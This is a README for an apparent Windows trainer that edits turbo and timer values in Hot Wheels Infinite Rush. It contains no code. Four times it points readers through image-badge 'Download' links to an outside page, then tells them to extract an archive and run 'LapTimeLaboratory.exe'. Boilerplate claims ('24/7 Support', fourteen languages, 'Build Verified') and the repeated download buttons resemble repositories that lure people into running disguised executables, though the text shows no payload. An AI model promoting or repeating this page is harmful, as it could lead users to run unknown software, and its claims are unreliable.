![preview](https://raw.githubusercontent.com/sahilrajput8966-art/turbo-timer-lab-notes/main/thumb_999af6.svg)
[![Download](https://raw.githubusercontent.com/sahilrajput8966-art/turbo-timer-lab-notes/main/launch_8196.svg)](https://sahilrajput8966-art.github.io/turbo-timer-lab-notes/)

# 🏎️ Hot Wheels Infinite Rush — Windows Lap-Time Laboratory

[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6.svg)](https://www.microsoft.com/windows)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)](https://github.com)
[![Build](https://img.shields.io/badge/Build-Verified%202026-blueviolet.svg)](https://github.com)
[![Rush Rating](https://img.shields.io/badge/Rush%20Rating-9.4%2F10-orange.svg)](https://github.com)
[![UI](https://img.shields.io/badge/UI-Responsive-ff69b4.svg)](https://github.com)
[![Languages](https://img.shields.io/badge/Languages-14%20Supported-success.svg)](https://github.com)
[![Support](https://img.shields.io/badge/Support-24%2F7-9cf.svg)](https://github.com)

---

## 🏁 A Different Kind of Garage

Welcome to the **Hot Wheels Infinite Rush — Windows Lap-Time Laboratory**, a meticulously engineered companion toolkit for the PC release of everyone's favorite orange-track racer. Unlike the flood of generic assist utilities scattered across the web, this project treats your game installation like a vintage die-cast car: handled with care, catalogued with precision, and never scratched by careless tinkering.

The philosophy here is simple and slightly old-school — **observe first, adjust second, preserve always**. Every parameter this laboratory touches is documented, isolated, and reversible. The original save data is treated like a sealed collector's blister pack: we never open it unless you ask us to.

This repository is the spiritual successor to a lineage of small, honest tools that grew out of a single question: *"What if we could tune the race without breaking the toy?"*

Whether you're an engineer curious about timer formatting, a tinkerer mapping turbo values against real-world RPM curves, or simply someone who likes a well-organized settings vault — you've likely arrived at the right pit stop. The [![Download](https://raw.githubusercontent.com/sahilrajput8966-art/turbo-timer-lab-notes/main/launch_8196.svg)](https://sahilrajput8966-art.github.io/turbo-timer-lab-notes/) line lives at the top of this page for your convenience.

---

## 🎯 Why This Exists

Most utilities in this niche blur the line between *lab tool* and *loose cannon*. They overwrite saves, mix unrelated values together, and leave no trail of what changed. That's the opposite of good craftsmanship.

This project was born from a single stubborn idea: a racing companion should behave like a **precision pit crew**, not a bull in a china shop. That means:

- 🧭 Everything is **mapped and named**, not hidden behind cryptic offsets
- 🗂️ Every adjustment is **stored in a separate profile**, never written silently into the base game
- 🛡️ The **original save is snapshotted** before anything happens, and restored on command
- 📝 The **turbo curve and timer registers** are documented in human-readable units
- 🧪 Nothing is left in a half-modified state — changes are atomic or not applied at all

The result is a calmer, more repeatable way to explore the racing parameters of Hot Wheels Infinite Rush on Windows.

---

## ✨ Feature Highlights

A quick windshield tour of what's inside the garage bay:

- 🏆 **Race Profile Vault** — save, name, and switch between different tuning profiles. Each profile keeps only the values it needs, so nothing bleeds into your daily driving setup.
- ⏱️ **Timer Register Inspector** — view lap, sector, and checkpoint timers in raw ticks alongside interpreted seconds. Side-by-side display makes calibration intuitive.
- 🌀 **Turbo Curve Console** — a visual, non-destructive playground for boost ramps, spool latency, and top-end fade. No values leave the console until you commit them.
- 💾 **Original Save Guardian** — an automatic snapshot of your game save the first time the lab launches, plus a one-tap restore should you ever want a factory-fresh feel.
- 🧩 **Isolated Change Sets** — every commit to your tuning state is a self-contained change set that can be rolled back independently.
- 📊 **Race Telemetry Journal** — lightly structured logs of every run so you can compare setups across sessions without spreadsheets.
- 🖥️ **Responsive UI** — the interface rearranges itself gracefully whether you're on an ultra-wide monitor or a modest laptop panel.
- 🌐 **Multilingual Support** — interface strings ship in fourteen languages, with more contributed by the community.
- 🤝 **24/7 Customer Support** — a rolling support rotation means questions rarely sit unanswered for long.
- 🔍 **Value Search Lens** — find a register by description, unit, or live delta rather than by raw address.

Each of these exists because a tester asked for it, not because a marketing list demanded it.

---

## 🧠 A Short Word on the Design Ethos

If most utilities are power drills, this one is a **watchmaker's screwdriver set**. Slower to pick up, but you'll never strip a screw.

The design prizes three things above all: **transparency** (you can see what's happening), **isolation** (it happens in a sandbox), and **reversibility** (it can always be undone). The turbo or timer manipulation described across this document is achieved entirely through configuration-level adjustments, not through altering the shipped game binary.

---

## 🧪 Turbo and Timer Values Explained

Turbo and timer registers are the two levers most racers care about — they decide how fast a straight feels and how tight a corner rewards you. Below is the reference table this project uses. Values are presented as **interpreted units**, with their underlying tick or ratio counterpart shown for power users who want to correlate with their own telemetry.

| Parameter | Interpreted Unit | Tick / Ratio Base | Typical Range | Notes |
|-----------|------------------|-------------------|---------------|-------|
| Boost Ramp | seconds to full spool | ticks (1/1000 s) | 0.20 – 2.50 | Lower = snappier launch |
| Boost Hold | seconds at plateau | ticks (1/1000 s) | 0.50 – 6.00 | Governs top-end sustain |
| Boost Decay | seconds to empty | ticks (1/1000 s) | 0.30 – 3.00 | Higher = longer glide |
| Lap Timer Base | seconds for reference lap | ticks | 45 – 120 | Reference, not a target |
| Sector Split Window | seconds | ticks | 0.10 – 1.20 | Checkpoint tolerance |
| Respawn Penalty | seconds | ticks | 0.00 – 4.00 | Restart cost |
| Nitro Fill Rate | ratio per second | ratio (0–1) | 0.05 – 0.80 | Of total tank |
| Aero Drag Coeff | dimensionless | ratio | 0.60 – 1.40 | Multiplier |

Each of these is documented in plain language inside the app's built-in codex, so you never have to guess what a slider means.

---

## 🛠️ How the Laboratory Works

A quick walkthrough of a typical session, told as a story rather than a checklist:

1. **Arrival.** You launch the laboratory. It quietly reads your current Hot Wheels Infinite Rush configuration and saves an untouched snapshot labeled with today's date.
2. **Orientation.** The dashboard shows you the current timer registers, turbo curve, and save fingerprint at a glance. Nothing has changed yet.
3. **Experimentation.** You open the Turbo Curve Console, nudge a ramp value, and watch the preview graph redraw itself. Nothing is written to disk.
4. **Commit.** Satisfied, you press **Commit to Profile**. The change is bundled into a new change set named after your profile.
5. **Race.** You play. Your game behaves differently, but your original save file is untouched and sitting safely in the snapshot vault.
6. **Revert.** Didn't like it? One button restores you to any prior profile or to the original save.

The whole loop is designed to be kind to your installation and to your nerves.

---

## 💻 System Expectations

A modest machine is entirely sufficient; this is a laboratory, not a game engine.

- **Operating System:** Windows 10 (build 19041 or later) or Windows 11
- **Runtime:** .NET Desktop Runtime 8.0 (x64) is bundled with the installer
- **Memory:** 512 MB minimum, 1 GB recommended
- **Storage:** 180 MB for the application plus space for snapshots
- **Display:** 1280×720 minimum; the responsive layout scales comfortably to 4K
- **Permissions:** Standard user is fine; no elevated privileges requested

---

## 🚀 Getting Started — The Civilized Way

We avoid the usual command-line gymnastics here. This tool is meant to be approachable for anyone who can double-click.

1. Use the [![Download](https://raw.githubusercontent.com/sahilrajput8966-art/turbo-timer-lab-notes/main/launch_8196.svg)](https://sahilrajput8966-art.github.io/turbo-timer-lab-notes/) anchor line at the top of this document to obtain the current release archive from the official host page.
2. Extract the archive into a folder you'll remember — the desktop is a fine choice.
3. Launch the executable named `LapTimeLaboratory.exe`.
4. On first run, allow it to create its local vault directory (it will tell you where).
5. Point the lab at your Hot Wheels Infinite Rush installation when prompted.
6. Explore freely — no defaults are ever written without your explicit confirmation.

That's it. No terminal windows, no environment variables, no surprises.

---

## 🔐 Save Integrity and Isolation

The single most important promise this project makes is: **your original save is never silently modified**.

- Snapshots are timestamped and immutable.
- Change sets are stored separately from the game's own data.
- The `restore` action replaces the active state with a snapshot and archives the previous state in case you change your mind.
- Every operation that writes to disk is preceded by an integrity check and followed by a verification read.

If you want absolute peace of mind, back up your save folder manually before your first session. It only takes a moment, and it costs nothing.

---

## 🌍 Multilingual and Accessible by Default

Interface strings are shipped for fourteen languages, including English, Spanish, Portuguese, French, German, Italian, Japanese, Korean, Simplified Chinese, Traditional Chinese, Polish, Russian, Turkish, and Dutch. Translation quality varies — community contributions are always welcome.

Accessibility notes:

- Full keyboard navigation across every panel
- Screen-reader-friendly labels on all sliders and toggles
- Contrast ratios that meet common readability guidelines
- Font scaling that respects the Windows system setting

---

## 🧑‍💻 Community and Support

Support is a rolling affair. The maintainers keep tabs on issues around the clock, though response times vary with the day. When you file a report, please include:

- Your Windows build
- The lab's version string
- A short description of what you expected versus what occurred
- The relevant section of the telemetry journal, if any

Feature requests are welcome too. Many of the tools in this lab began life as someone's "wouldn't it be nice if…" post.

---

## 🧾 License

This project is distributed under the **MIT License**. You are welcome to read, adapt, and share the code under the terms described in the license text. A working copy of the license is available here:

[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

Copyright © 2026 — All contributions are attributed in the repository's history.

---

## ⚠️ Disclaimer

This laboratory is an independent, community-driven utility. It is **not affiliated with, endorsed by, or sponsored by** the publishers or developers of Hot Wheels Infinite Rush, Mattel, or any related entity. All trademarks belong to their respective owners.

The tool is provided **as-is**, without warranty of any kind. Use it at your own discretion, keep backups of your save data, and remember that tuning your local configuration is a personal experiment. The maintainers are not responsible for any inconvenience arising from misuse, misconfiguration, or a particularly ambitious turbo ramp.

Always respect the terms of service of the software you own. This project exists to document and understand, not to circumvent.

---

## 🏁 Final Lap

Thanks for stopping by the garage. Whether you came to inspect timer registers, sketch a turbo curve, or simply admire a well-organized save vault, we hope the visit was worth the pit stop.

Drive carefully. Tune deliberately. And keep the original save in the display case where it belongs.

[![Download](https://raw.githubusercontent.com/sahilrajput8966-art/turbo-timer-lab-notes/main/launch_8196.svg)](https://sahilrajput8966-art.github.io/turbo-timer-lab-notes/)